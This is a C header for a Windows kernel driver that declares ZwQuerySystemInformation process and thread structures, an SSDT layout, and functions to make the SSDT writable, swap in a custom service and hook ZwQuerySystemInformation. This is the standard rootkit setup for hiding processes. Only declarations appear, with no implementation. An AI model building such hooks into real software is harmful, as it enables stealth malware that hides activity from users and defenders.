/*Structures that are used by ZwQuerySystemInformation*/
struct _SYSTEM_THREADS {
	LARGE_INTEGER	KernelTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	CreateTime;
	ULONG			WaitTime;
	PVOID			StartAddress;
	CLIENT_ID		ClientIs;
	KPRIORITY		Priority;
	KPRIORITY		BasePriority;
	ULONG			ContextSwitchCount;
	ULONG			ThreadState;
	KWAIT_REASON	WaitReason;
};
struct _SYSTEM_PROCESSES {
	ULONG 					NextEntryDelta;
	ULONG 					ThreadCount;
	ULONG 					Reserved[6];
	LARGE_INTEGER 			CreateTime;
	LARGE_INTEGER 			UserTime;
	LARGE_INTEGER 			KernelTime;
	UNICODE_STRING 			ProcessName;
	KPRIORITY 				BasePriority;
	ULONG 					ProcessId;
	ULONG 					InheritedFromProcessId;
	ULONG 					HandleCount;
	ULONG 					Reserved2[2];
	VM_COUNTERS 			VmCounters; //win2k only
	IO_COUNTERS 			IoCounters;
	struct _SYSTEM_THREADS 	Threads[1];
};

/*Prototype of the ZwQuerySystemInformation function type*/
typedef NTSTATUS (*ZwQuerySystemInformationPrototype) (ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

typedef struct SystemServiceDescriptorTable {
	/*Base address of the System Service Table*/
	void*                 ServiceTableBase; 
	void*                 ServiceCounterTableBase; 
	/*Number of services in the table*/
	unsigned int          NumberOfServices; 
	/*Pointer to System Service Parameter Table*/
	unsigned char*        ParamTableBase; 
} SSDT;  

/*Makes SSDT writable */ 
int ssdt_modify();
/*Restores SSDT to default*/
int ssdt_restore();
/*Replaces system function with custom defined one*/
unsigned long ssdt_writeService(unsigned long, unsigned long);

/*Takes the address of a Zw* function and returns its corresponding index number in the SSDT*/
#define SYSCALL_INDEX(_Function)*(PULONG)((PUCHAR)_Function+1)

/* original function */
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation( ULONG systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);

/* new version of function */
NTSTATUS hookZwQuerySystemInformation( ULONG , PVOID , ULONG , PULONG );